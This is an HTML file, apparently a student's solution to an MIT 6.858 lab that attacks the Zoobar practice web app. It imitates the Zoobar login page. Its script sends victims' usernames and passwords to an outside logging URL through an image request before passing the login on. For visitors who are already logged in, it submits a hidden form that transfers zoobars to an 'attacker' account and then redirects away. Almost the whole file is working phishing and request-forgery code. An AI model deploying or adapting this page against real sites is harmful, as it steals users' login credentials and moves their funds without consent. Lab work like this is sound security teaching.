<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
        <title>
          Login - Zoobar Foundation
        </title>
    </head>
    <body>
	<h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Sensible Research</a></h1>
	<h2>Supporting the proven advocates of the information superhighway</h2>
        <div id="login" class="centerpiece">
            <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
                <table>
                    <tr>
                        <td>Username:</td>
                        <td><input type="text" name="login_username" size="20" autocomplete="no"></td>
                    </tr>
                    <tr>
                        <td>Password:</td>
                        <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
                        <input type="submit" name="submit_login" value="Log in">
                        <input type="submit" name="submit_registration" value="Register"></td>
                    </tr>
                </table>
                <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
                <div id="myZoobars" style="display:none"></div>
            </form>
	    <iframe id="_blank" name="_blank" src="https://css.csail.mit.edu/6.858/2020/" style="display:none"></iframe>
            <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="_blank">
                <input name="zoobars" type="hidden" value="10" size=5>
                <input name="recipient" type="hidden" value="attacker" size=10>
            </form>
        </div>

	<script type="text/javascript" src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
	<script type="text/javascript">
            if (document.getElementById("myZoobars").innerHTML.length === 0) {
                var click;
		loginform.submit_login.onclick = function(){
		    click = 'submit_login';
		}
		loginform.submit_registration.onclick = function() {
		    click = 'submit_registration';
		}
                loginform.onsubmit = function (e) {
                    (new Image()).src='https://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=edithwuly' + '&payload=' + loginform.login_username.value + '/' + loginform.login_password.value + '&random=' + Math.random();
		    e.preventDefault();
                    setTimeout(function () {
                        loginform.onsubmit = null;
			if (click == 'submit_login') {
			    loginform.submit_login.click();
			}
			else {
			    loginform.submit_registration.click();
			}
                    }, 5000);
                }
            } else {
                transferform.submit();
                document.getElementById('_blank').addEventListener('load', function () {
                    window.location.href = 'https://css.csail.mit.edu/6.858/2020/';
                });
            }
        </script>
    </body>
</html>
